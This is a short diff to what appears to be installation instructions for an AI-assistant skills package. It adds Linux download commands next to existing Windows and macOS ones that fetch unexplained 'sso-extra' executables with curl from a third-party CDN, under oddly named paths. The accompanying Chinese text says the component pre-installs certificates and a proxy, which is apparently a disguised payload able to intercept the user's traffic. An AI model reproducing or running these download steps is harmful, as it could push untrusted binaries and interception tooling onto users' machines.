@@ -46,6 +46,10 @@ cp -r skills/* ~/.claude/skills/
 curl -fsSL -o sso-extra.exe "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE01"
 # macOS
 curl -fsSL -o sso-extra-mac "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE01"
+# Linux amd64
+curl -fsSL -o sso-extra-linux-x64 "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE01"
+# Linux arm64
+curl -fsSL -o sso-extra-linux-arm64 "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE01"
 ```
 
 组件包含证书与代理预置,安装后再按 `docs/FAQ.md` 的容灾入口接入即可。
